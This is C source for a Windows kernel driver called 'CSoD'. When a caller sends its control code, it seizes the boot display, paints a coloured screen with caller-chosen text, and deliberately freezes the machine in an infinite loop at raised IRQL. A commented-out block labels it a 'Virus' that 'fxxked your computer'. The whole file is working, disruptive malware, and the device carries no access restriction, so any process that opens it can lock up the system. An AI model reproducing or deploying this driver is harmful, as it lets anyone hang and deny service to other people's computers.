#include "Includes.h"
#include "BOOTVID.h"
#include "ControlCode.h"

#define _CSoD_COLORFUL_SCREEN 0

PDEVICE_OBJECT g_pDeviceObject = NULL;
UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");

//KIRQL Irql = KeRaiseIrqlToDpcLevel();
//
//if (InbvIsBootDriverInstalled())
//{
//	InbvAcquireDisplayOwnership();
//	InbvResetDisplay();
//
//#if _CSoD_COLORFUL_SCREEN
//	USHORT LastWidth = 0,
//		LastHeight = 0;
//
//	for (USHORT Width = 0; Width < SCREEN_WIDTH; Width++)
//	{
//		for (USHORT Height = 0; Height < SCREEN_HEIGHT; Height++)
//		{
//			InbvSolidColorFill(LastWidth, LastHeight, Width, Height, BV_MAX_COLORS - ((Width + Height) % BV_MAX_COLORS));
//
//			LastHeight = Height;
//		}
//
//		LastWidth = Width;
//	}
//#else
//	InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_CYAN);
//#endif
//
//	InbvSetTextColor(BV_COLOR_WHITE);
//	InbvInstallDisplayStringFilter(NULL);
//	InbvEnableDisplayString(TRUE);
//	InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
//}
//
//CHAR Text1[] = "Virus by Mitsuha & gt428 & TSK fxxked your computer so you got a strange CSoD.";
//CHAR Text2[] = "Please SANLIAN TOUBI GUANZHU!";
//
//for (USHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT / 2; j++)
//{
//	for (USHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; i++)
//		InbvDisplayString((PUCHAR)" ");
//	InbvDisplayString((PUCHAR)Text1);
//	InbvDisplayString((PUCHAR)"\r\n");
//
//	for (USHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text2) + 1) / 2; i++)
//		InbvDisplayString((PUCHAR)" ");
//	InbvDisplayString((PUCHAR)Text2);
//	InbvDisplayString((PUCHAR)"\r\n");
//}
//
//while (TRUE)
//;
//
//KeLowerIrql(Irql);

NTSTATUS
PassRequest(
	IN PDEVICE_OBJECT pDeviceObject,
	IN OUT PIRP pIrp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);

	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS
DeviceIoControl(
	IN PDEVICE_OBJECT pDeviceObject,
	IN OUT PIRP pIrp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);

	ULONG_PTR nUsedLength = 0;

	PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	PCSoD_DATA pSystemBuffer = (PCSoD_DATA)pIrp->AssociatedIrp.SystemBuffer;
	ULONG ulInBufferLength = pStackLocation->Parameters.DeviceIoControl.InputBufferLength;

	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

	if (ulInBufferLength == sizeof(CSoD_DATA))
		switch (pStackLocation->Parameters.DeviceIoControl.IoControlCode)
		{
			case CTL_DO_CSoD:
			{
				nUsedLength = sizeof(CSoD_DATA);

				KIRQL Irql = KeRaiseIrqlToDpcLevel();

				if (InbvIsBootDriverInstalled())
				{
					InbvAcquireDisplayOwnership();
					InbvResetDisplay();

					InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, pSystemBuffer->BackColor);

					InbvSetTextColor(pSystemBuffer->TextColor);
					InbvInstallDisplayStringFilter(NULL);
					InbvEnableDisplayString(TRUE);
					InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
				}

				InbvDisplayString((PUCHAR)pSystemBuffer->Text);

				while (TRUE)
					;

				KeLowerIrql(Irql);
			}

			default:
				ntStatus = STATUS_INVALID_DEVICE_REQUEST;
				break;
		}

	pIrp->IoStatus.Information = nUsedLength;
	pIrp->IoStatus.Status = ntStatus;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}

VOID
DriverUnload(
	IN PDRIVER_OBJECT pDriverObject
)
{
	UNREFERENCED_PARAMETER(pDriverObject);

	IoDeleteDevice(g_pDeviceObject);
	IoDeleteSymbolicLink(&g_uniSymbolName);
}

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	pDriverObject->DriverUnload = DriverUnload;

	for (USHORT i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
		pDriverObject->MajorFunction[i] = PassRequest;

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControl;

	UNICODE_STRING uniDeviceName = RTL_CONSTANT_STRING(L"\\Device\\CSoD");
	NTSTATUS ntStatus = IoCreateDevice(pDriverObject, 0, &uniDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_pDeviceObject);
	if (NT_SUCCESS(ntStatus))
	{
		g_pDeviceObject->Flags |= DO_BUFFERED_IO;
		IoCreateSymbolicLink(&g_uniSymbolName, &uniDeviceName);
	}

	return STATUS_SUCCESS;
}